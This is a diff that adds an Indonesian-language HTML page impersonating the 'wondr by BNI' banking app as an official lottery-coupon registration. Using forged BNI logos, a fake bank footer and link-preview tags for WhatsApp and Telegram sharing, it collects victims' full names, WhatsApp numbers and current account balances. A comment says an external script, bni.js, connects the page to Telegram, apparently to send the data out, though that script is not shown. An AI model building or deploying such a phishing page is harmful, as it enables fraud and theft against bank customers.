@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <!-- Viewport dikunci agar tidak bisa zoom -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>wondr by BNI - Pendaftaran Resmi Kupon Undian</title>
+
+    <!-- Meta Tags untuk Open Graph (Pratinjau Link di WhatsApp / Telegram / Medsos) -->
+    <meta property="OG:title" content="wondr by BNI - Pendaftaran Resmi Kupon Undian">
+    <meta property="OG:description" content="Lengkapi data diri Anda untuk mengikuti program undian berhadiah resmi dari wondr by BNI.">
+    <meta property="OG:image" content="https://i.ibb.co.com/Gf8sDQqb/46-AB0930-A09-E-40-FD-9-AA3-8265-B50-B420-F.png">
+    <meta property="OG:type" content="website">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Background image setup */
+        .bg-custom {
+            background-image: url('https://i.ibb.co.com/97dcDvS/IMG-2989.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+
+        /* Mencegah auto-zoom pada input saat fokus di browser HP */
+        input, select, textarea {
+            font-size: 16px !important;
+        }
+
+        /* Efek kursor mesin ketik */
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .typing-cursor {
+            display: inline-block;
+            width: 2px;
+            background-color: white;
+            animation: blink 0.8s infinite;
+            margin-left: 2px;
+            vertical-align: bottom;
+        }
+    </style>
+</head>
+<body class="bg-custom min-h-screen flex flex-col justify-between text-gray-800 antialiased selection:bg-teal-500 selection:text-white">
+
+    <!-- INITIAL LOADING SCREEN (Muncul Pertama Kali Saat Web Dibuka) -->
+    <div id="initialLoading" class="fixed inset-0 bg-white z-[100] flex flex-col items-center justify-center p-4">
+        <img src="https://i.ibb.co.com/6cCmnWLc/IMG-2990.png" alt="wondr by BNI" class="h-12 w-auto mb-6 object-contain animate-pulse">
+        <div class="w-10 h-10 border-4 border-[#f37021] border-t-transparent rounded-full animate-spin mb-3"></div>
+        <p class="text-xs font-semibold text-gray-500 tracking-wider uppercase">Memuat Halaman...</p>
+    </div>
+
+    <!-- Header Navigation + Teks Berjalan Menyatu di Atas -->
+    <header class="sticky top-0 z-50 bg-white/90 backdrop-blur-md shadow-sm border-b border-gray-100">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <!-- Logo Section (Header) -->
+            <div class="flex items-center">
+                <img src="https://i.ibb.co.com/6cCmnWLc/IMG-2990.png" alt="wondr by BNI" class="h-8 w-auto object-contain">
+            </div>
+
+            <!-- Mobile & Desktop Menu Icon -->
+            <button class="p-2 rounded-lg text-gray-600 hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-teal-500 transition-colors" aria-label="Open Menu">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                </svg>
+            </button>
+        </div>
+        <!-- Teks Berjalan Menyatu Persis di Bawah Navbar Logo -->
+        <div class="bg-teal-600 text-white text-[11px] sm:text-xs font-medium py-1.5 px-3 overflow-hidden whitespace-nowrap border-t border-teal-500">
+            <marquee scrollamount="5">
+                ✨ Selamat Datang di Pendaftaran Resmi Kupon Undian wondr by BNI — Lengkapi Data Diri Anda Sekarang dan Menangkan Berbagai Hadiah Menarik! ✨
+            </marquee>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex flex-col items-center justify-center p-4 py-8 relative">
+        
+        <!-- LOADING OVERLAY FORM SUBMIT -->
+        <div id="loadingOverlay" class="absolute inset-0 bg-white/85 backdrop-blur-sm z-50 flex flex-col items-center justify-center hidden">
+            <div class="w-12 h-12 border-4 border-[#f37021] border-t-transparent rounded-full animate-spin mb-3"></div>
+            <p class="text-sm font-semibold text-gray-700 tracking-wide">Memproses Data...</p>
+        </div>
+
+        <!-- CONTAINER UTAMA -->
+        <div class="w-full max-w-md space-y-4">
+            
+            <!-- GAMBAR BANNER (Ukuran otomatis proporsional) -->
+            <div class="w-full bg-white/95 backdrop-blur-md rounded-2xl shadow-lg overflow-hidden border border-gray-100 flex items-center justify-center p-2">
+                <img src="https://i.ibb.co.com/Gf8sDQqb/46-AB0930-A09-E-40-FD-9-AA3-8265-B50-B420-F.png" alt="Banner Promo" class="w-full h-auto object-contain rounded-xl">
+            </div>
+
+            <!-- KOTAK FORMULIR & HALAMAN 2 -->
+            <div class="w-full bg-white/95 backdrop-blur-md rounded-2xl shadow-xl overflow-hidden border border-gray-100 relative">
+                
+                <!-- HALAMAN 1: FORMULIR INPUT -->
+                <div id="page1" class="p-6">
+                    <h2 class="text-xl font-bold text-gray-900 text-center mb-1">Formulir Informasi</h2>
+                    <p class="text-xs text-gray-500 text-center mb-6">Lengkapi data di bawah ini dengan benar</p>
+
+                    <form id="dataForm" class="space-y-4">
+                        <!-- Input Nama -->
+                        <div>
+                            <label for="fullName" class="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-1">Nama Lengkap</label>
+                            <input type="text" id="fullName" name="fullName" required placeholder="Masukkan nama lengkap" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-teal-500 focus:border-transparent transition-all text-sm bg-gray-50 focus:bg-white">
+                        </div>
+
+                        <!-- Input Nomor WhatsApp -->
+                        <div>
+                            <label for="whatsapp" class="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-1">Nomor WhatsApp</label>
+                            <div class="relative">
+                                <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-gray-500 text-sm font-medium">+62</span>
+                                <input type="tel" id="whatsapp" name="whatsapp" required minlength="10" maxlength="13" placeholder="81234567890" class="w-full pl-14 pr-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-teal-500 focus:border-transparent transition-all text-sm bg-gray-50 focus:bg-white">
+                            </div>
+                            <p id="waError" class="text-xs text-red-500 mt-1 hidden">Nomor WhatsApp harus 10 hingga 13 digit.</p>
+                        </div>
+
+                        <!-- Input Saldo Rp -->
+                        <div>
+                            <label for="balance" class="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-1">Saldo saat ini (Rp)</label>
+                            <div class="relative">
+                                <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-gray-500 text-sm font-semibold">Rp</span>
+                                <input type="tel" id="balance" name="balance" required placeholder="0" class="w-full pl-12 pr-4 py-3 rounded-xl border border-gray-200 focus:outline-none focus:ring-2 focus:ring-teal-500 focus:border-transparent transition-all text-sm bg-gray-50 focus:bg-white font-medium">
+                            </div>
+                        </div>
+
+                        <!-- Tombol Kirim -->
+                        <button type="submit" id="submitBtn" class="w-full mt-2 bg-gradient-to-r from-teal-500 to-teal-600 hover:from-teal-600 hover:to-teal-700 text-white font-semibold py-3.5 px-4 rounded-xl shadow-md hover:shadow-lg focus:outline-none focus:ring-2 focus:ring-teal-500 focus:ring-offset-2 transition-all">
+                            Lanjutkan
+                        </button>
+                    </form>
+                </div>
+
+                <!-- HALAMAN 2: KOTAK TEKS EFEK MESIN KETIK & TOMBOL PUTAR SUARA -->
+                <div id="page2" class="p-6 hidden">
+                    <div class="w-full bg-[#f37021] border-2 border-white/35 rounded-2xl p-6 shadow-lg text-white text-center flex flex-col items-center justify-center relative overflow-hidden space-y-4">
+                        <p id="typingText" class="text-sm md:text-base font-medium leading-relaxed tracking-wide min-h-[100px] flex items-center justify-center"></p>
+                        
+                        <!-- Tombol Cadangan Pemutar Suara -->
+                        <button onclick="playVoiceMessage()" class="bg-white text-[#f37021] text-xs font-bold py-2 px-4 rounded-full shadow hover:bg-gray-100 transition-all flex items-center space-x-1.5">
+                            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                                <path d="M10 3.5a1.5 1.5 0 011.06.44l4.5 4.5a1.5 1.5 0 010 2.12l-4.5 4.5a1.5 1.5 0 01-2.12-2.12L11.88 10 9.44 7.56A1.5 1.5 0 0110 3.5z"/>
+                            </svg>
+                            <span>Putar Ulang Suara</span>
+                        </button>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Footer dengan Logo dan Teks BNI -->
+    <footer class="bg-white/80 backdrop-blur-md border-t border-gray-100 py-6">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col sm:flex-row items-center justify-between gap-4">
+            <div class="flex items-center space-x-3">
+                <img src="https://i.ibb.co.com/6cCmnWLc/IMG-2990.png" alt="Logo BNI" class="h-6 w-auto object-contain">
+                <span class="text-xs sm:text-sm font-semibold text-gray-700">PT Bank Negara Indonesia (Persero) Tbk.</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Hubungkan Script Eksternal Telegram -->
+    <script src="bni.js"></script>
+
+</body>
+</html>
+
